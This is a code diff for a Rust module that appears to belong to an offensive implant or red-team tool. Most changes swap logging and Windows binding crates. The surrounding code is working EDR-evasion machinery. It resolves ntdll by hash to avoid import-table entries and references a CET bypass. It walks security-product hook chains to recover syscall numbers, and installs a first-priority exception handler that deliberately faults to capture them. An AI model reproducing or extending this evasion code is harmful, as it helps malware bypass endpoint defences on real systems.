@@ -100,7 +100,7 @@ const NO_ACTIVE_RESOLVE: usize = 0;
 // ─── Minimal VEH Types ────────────────────────────────────────────────────
 //
 // Local definitions matching cet_bypass.rs pattern.  Avoids importing
-// winapi::um::winnt types which would create IAT entries.
+//  types which would create IAT entries.
 
 type DWORD = u32;
 type PVOID = *mut std::ffi::c_void;
@@ -186,12 +186,12 @@ fn get_ntdll_range() -> Option<(usize, usize)> {
         let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
 
         // Read the PE headers to determine SizeOfImage.
-        let dos = &*(ntdll_base as *const winapi::um::winnt::IMAGE_DOS_HEADER);
+        let dos = &*(ntdll_base as *const windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER);
         if dos.e_magic != 0x5A4D {
             return None;
         }
         let nt = &*((ntdll_base + dos.e_lfanew as usize)
-            as *const winapi::um::winnt::IMAGE_NT_HEADERS64);
+            as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64);
         let size_of_image = nt.OptionalHeader.SizeOfImage as usize;
 
         Some((ntdll_base, ntdll_base + size_of_image))
@@ -272,7 +272,7 @@ unsafe fn walk_hook_chain_and_extract_ssn(addr: usize) -> Option<u32> {
             if bytes[3] == 0xB8 {
                 let ssn = u32::from_le_bytes(bytes[4..8].try_into().ok()?);
                 if ssn < 0x1000 {
-                    log::debug!(
+                    tracing::debug!(
                         "exception_ssn: found unhooked prologue at {:#x}, SSN={}",
                         current,
                         ssn
@@ -287,7 +287,7 @@ unsafe fn walk_hook_chain_and_extract_ssn(addr: usize) -> Option<u32> {
         // Not an unhooked prologue — try to follow the hook.
         match follow_hook_hop(current) {
             Some(next) => {
-                log::trace!(
+                tracing::trace!(
                     "exception_ssn: hook hop {:#x} → {:#x}",
                     current,
                     next
@@ -298,7 +298,7 @@ unsafe fn walk_hook_chain_and_extract_ssn(addr: usize) -> Option<u32> {
                 // Unknown instruction sequence — try scanning the current
                 // address for mov eax anyway; some hooks embed the SSN
                 // before redirecting.
-                log::debug!(
+                tracing::debug!(
                     "exception_ssn: unrecognized byte pattern at {:#x}: \
                      {:02X?}, attempting direct scan",
                     current,
@@ -309,7 +309,7 @@ unsafe fn walk_hook_chain_and_extract_ssn(addr: usize) -> Option<u32> {
         }
     }
 
-    log::warn!(
+    tracing::warn!(
         "exception_ssn: hook chain depth exhausted starting from {:#x}",
         addr
     );
@@ -395,7 +395,7 @@ unsafe extern "system" fn veh_exception_ssn_handler(
     let ssn = match walk_hook_chain_and_extract_ssn(resolve_addr) {
         Some(s) => s,
         None => {
-            log::debug!(
+            tracing::debug!(
                 "exception_ssn: VEH handler could not extract SSN for \
                  resolve_addr={:#x}, rip={:#x}",
                 resolve_addr,
@@ -418,7 +418,7 @@ unsafe extern "system" fn veh_exception_ssn_handler(
         FAULT_RESUME_RIP.with(|c| c.set(0));
     }
 
-    log::debug!(
+    tracing::debug!(
         "exception_ssn: captured SSN={} for resolve_addr={:#x} \
          (fault rip={:#x}, controlled={})",
         ssn,
@@ -445,7 +445,7 @@ fn install_veh_handler() -> bool {
     let range = match get_ntdll_range() {
         Some(r) => r,
         None => {
-            log::error!("exception_ssn: failed to determine ntdll address range");
+            tracing::error!("exception_ssn: failed to determine ntdll address range");
             return false;
         }
     };
@@ -457,7 +457,7 @@ fn install_veh_handler() -> bool {
     } {
         Some(b) => b,
         None => {
-            log::error!(
+            tracing::error!(
                 "exception_ssn: failed to resolve kernel32 for AddVectoredExceptionHandler"
             );
             return false;
@@ -472,7 +472,7 @@ fn install_veh_handler() -> bool {
     } {
         Some(a) => a,
         None => {
-            log::error!("exception_ssn: failed to resolve AddVectoredExceptionHandler");
+            tracing::error!("exception_ssn: failed to resolve AddVectoredExceptionHandler");
             return false;
         }
     };
@@ -487,12 +487,12 @@ fn install_veh_handler() -> bool {
     // Install as first handler (first=1) for maximum priority.
     let handle = unsafe { add_veh(1, veh_exception_ssn_handler) };
     if handle.is_null() {
-        log::error!("exception_ssn: AddVectoredExceptionHandler returned NULL");
+        tracing::error!("exception_ssn: AddVectoredExceptionHandler returned NULL");
         return false;
     }
 
     VEH_INSTALLED.store(true, Ordering::Release);
-    log::info!("exception_ssn: VEH handler installed successfully (ntdll range {:#x}–{:#x})", range.0, range.1);
+    tracing::info!("exception_ssn: VEH handler installed successfully (ntdll range {:#x}–{:#x})", range.0, range.1);
     true
 }
 
@@ -537,13 +537,13 @@ fn resolve_ssn_by_chain_walk(func_name: &str) -> Option<u32> {
 pub fn resolve_ssn_via_exception(func_name: &str) -> Option<u32> {
     // Ensure the VEH handler is installed.
     if !install_veh_handler() {
-        log::warn!("exception_ssn: VEH handler not installed; trying chain walk only");
+        tracing::warn!("exception_ssn: VEH handler not installed; trying chain walk only");
         return resolve_ssn_by_chain_walk(func_name);
     }
 
     // Fast path: try direct chain walk first (no exception overhead).
     if let Some(ssn) = resolve_ssn_by_chain_walk(func_name) {
-        log::debug!(
+        tracing::debug!(
             "exception_ssn: resolved SSN={} for {} via direct chain walk",
             ssn,
             func_name
@@ -553,7 +553,7 @@ pub fn resolve_ssn_via_exception(func_name: &str) -> Option<u32> {
 
     // Slow path: trigger an access violation and let the VEH handler
     // extract the SSN.
-    log::debug!(
+    tracing::debug!(
         "exception_ssn: direct chain walk failed for {}, trying exception-based resolution",
         func_name
     );
@@ -622,7 +622,7 @@ pub fn resolve_ssn_via_exception(func_name: &str) -> Option<u32> {
     // Check if the VEH handler captured an SSN.
     let captured = CAPTURED_SSN.with(|cell| cell.get());
     if let Some(ssn) = captured {
-        log::info!(
+        tracing::info!(
             "exception_ssn: resolved SSN={} for {} via exception-based probe (fault at 0x1)",
             ssn,
             func_name
@@ -630,7 +630,7 @@ pub fn resolve_ssn_via_exception(func_name: &str) -> Option<u32> {
         return Some(ssn);
     }
 
-    log::warn!("exception_ssn: failed to resolve SSN for {}", func_name);
+    tracing::warn!("exception_ssn: failed to resolve SSN for {}", func_name);
     None
 }
 
